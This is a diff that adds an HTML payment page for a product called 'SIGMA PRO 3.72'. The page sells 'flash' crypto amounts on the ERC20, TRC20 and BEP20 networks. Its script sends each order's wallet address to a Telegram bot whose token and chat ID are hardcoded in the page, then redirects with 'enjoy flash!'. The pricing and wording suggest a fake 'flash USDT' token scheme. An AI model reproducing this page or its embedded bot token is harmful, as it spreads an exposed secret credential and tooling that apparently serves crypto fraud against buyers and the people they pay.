@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Payment Page</title>
+<style>
+  * {
+    box-sizing: border-box;
+  }
+  html, body {
+    margin: 0; 
+    padding: 0;
+    height: 100%;
+    font-family: Arial, sans-serif, 'Cairo', sans-serif;
+    background: black;
+    color: white;
+    overflow-x: hidden;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+  }
+  .container {
+    width: 90vw;
+    max-width: 260px;
+    background: rgba(20, 20, 30, 0.9);
+    border-radius: 10px;
+    padding: 14px 16px;
+    box-shadow: 0 0 15px #00ffc8;
+    text-align: left;
+    margin: 10px;
+  }
+  .title-container {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    margin-bottom: 16px;
+  }
+  .title-container img {
+    height: 24px;
+    width: 24px;
+    object-fit: contain;
+  }
+  .title-container h2 {
+    font-size: 1.1rem;
+    font-weight: 700;
+    letter-spacing: 0.03em;
+    margin: 0;
+  }
+  label {
+    font-size: 0.85rem;
+    font-weight: 600;
+    margin-bottom: 4px;
+    display: block;
+  }
+  select, input[type="text"], input[readonly] {
+    width: 100%;
+    padding: 8px 10px;
+    margin-bottom: 14px;
+    font-size: 0.9rem;
+    border-radius: 8px;
+    border: none;
+    background: #222;
+    color: white;
+    outline-offset: 2px;
+    outline-color: #00ffc8;
+  }
+  .network-options {
+    display: flex;
+    justify-content: space-between;
+    gap: 6px;
+    margin-bottom: 22px;
+  }
+  .network-options label {
+    flex: 1;
+    background: #222;
+    padding: 8px 0;
+    border-radius: 12px;
+    text-align: center;
+    cursor: pointer;
+    font-size: 0.9rem;
+    font-weight: 600;
+    color: #ccc;
+    transition: all 0.3s ease;
+    user-select: none;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 6px;
+  }
+  .network-options label img {
+    height: 18px;
+    width: 18px;
+    object-fit: contain;
+  }
+  .network-options input[type="radio"] {
+    display: none;
+  }
+  .network-options input[type="radio"]:checked + label {
+    background: #00ffc8;
+    color: #000;
+    font-weight: 700;
+    box-shadow: 0 0 6px #00ffc8;
+  }
+  #btn-next {
+    width: 100%;
+    padding: 12px 0;
+    font-size: 1rem;
+    color: white;
+    background: transparent;
+    border: 2px solid #00ffc8;
+    border-radius: 16px;
+    cursor: pointer;
+    font-weight: 700;
+    letter-spacing: 0.06em;
+    transition: background-color 0.3s ease, color 0.3s ease;
+  }
+  #btn-next:hover {
+    background-color: #00ffc8;
+    color: black;
+  }
+  #message {
+    margin-top: 10px;
+    text-align: center;
+    font-size: 0.9rem;
+    font-weight: 600;
+    min-height: 20px;
+    color: #ff4d4d;
+  }
+
+  /* زر تلغرام عائم */
+  .floating-btn {
+    position: fixed;
+    bottom: 20px;
+    right: 20px;
+    width: 56px;
+    height: 56px;
+    background-color: white;
+    border-radius: 50%;
+    box-shadow: 0 0 12px #00ffc8;
+    z-index: 999;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    transition: transform 0.3s ease, box-shadow 0.3s ease;
+  }
+  .floating-btn img {
+    width: 30px;
+    height: 30px;
+  }
+  .floating-btn:hover {
+    transform: scale(1.1);
+    box-shadow: 0 0 18px #00ffc8;
+  }
+</style>
+</head>
+<body>
+
+<div class="container" role="main" aria-label="Payment form">
+  <div class="title-container">
+    <img src="abstergo.png" alt="Logo" />
+    <h2>SIGMA PRO 3.72</h2>
+  </div>
+
+  <label for="amount">Amount</label>
+  <select id="amount" onchange="updatePrice()">
+    <option value="10">1000</option>
+    <option value="25">5000</option>
+    <option value="50">25000</option>
+    <option value="120">100000</option>
+  </select>
+
+  <label id="network-label">Network</label>
+  <div class="network-options" role="radiogroup" aria-labelledby="network-label">
+    <input type="radio" name="network" id="erc" value="ERC20" checked />
+    <label for="erc" role="radio" tabindex="0">
+      <img src="erc.png" alt="ERC20 logo" /> ERC20
+    </label>
+
+    <input type="radio" name="network" id="trc" value="TRC20" />
+    <label for="trc" role="radio" tabindex="0">
+      <img src="paypal.png" alt="TRC20 logo" /> TRC20
+    </label>
+
+    <input type="radio" name="network" id="bep" value="BEP20" />
+    <label for="bep" role="radio" tabindex="0">
+      <img src="bep.png" alt="BEP20 logo" /> BEP20
+    </label>
+  </div>
+
+  <label for="wallet-address">Wallet Address</label>
+  <input type="text" id="wallet-address" placeholder="Enter your wallet address" aria-required="true" />
+
+  <label for="price">USD Amount</label>
+  <input type="text" id="price" readonly value="$10" aria-readonly="true" />
+
+  <button id="btn-next" onclick="submitForm()">Next</button>
+
+  <div id="message" role="alert" aria-live="assertive"></div>
+</div>
+
+<!-- زر تلغرام عائم -->
+<a href="https://t.me/Sigmateam6" class="floating-btn" target="_blank" title="Telegram Support" aria-label="Open Telegram Chat">
+  <img src="https://cdn-icons-png.flaticon.com/512/2111/2111646.png" alt="Telegram" />
+</a>
+
+<script>
+  function updatePrice() {
+    const amount = document.getElementById("amount").value;
+    document.getElementById("price").value = "$" + amount;
+  }
+
+  function submitForm() {
+    const amount = document.getElementById("amount").value;
+    const network = document.querySelector('input[name="network"]:checked').value;
+    const walletAddress = document.getElementById("wallet-address").value.trim();
+    const messageBox = document.getElementById("message");
+
+    messageBox.style.color = '#ff4d4d'; // error color
+
+    if (!walletAddress) {
+      messageBox.textContent = "Please enter your wallet address.";
+      return;
+    }
+
+    messageBox.textContent = "Sending...";
+
+    const message = `💳 NEW ORDER\nAmount: $${amount}\nNetwork: ${network}\nWallet: ${walletAddress}`;
+
+    fetch(`https://api.telegram.org/bot7764054336:AAG6gKWXmHqHB8uC3UFzDQ6OLt4QMdKJ4mk/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: "7739393558", text: message })
+    }).then(response => {
+      if (!response.ok) throw new Error('Network error');
+      messageBox.style.color = '#00ffb0';
+      messageBox.textContent = "enjoy flash! Redirecting...";
+      setTimeout(() => {
+        window.location.href = "payment.html";
+      }, 1500);
+    }).catch(() => {
+      messageBox.textContent = "Error sending data. Please try again.";
+    });
+  }
+</script>
+
+</body>
+</html>
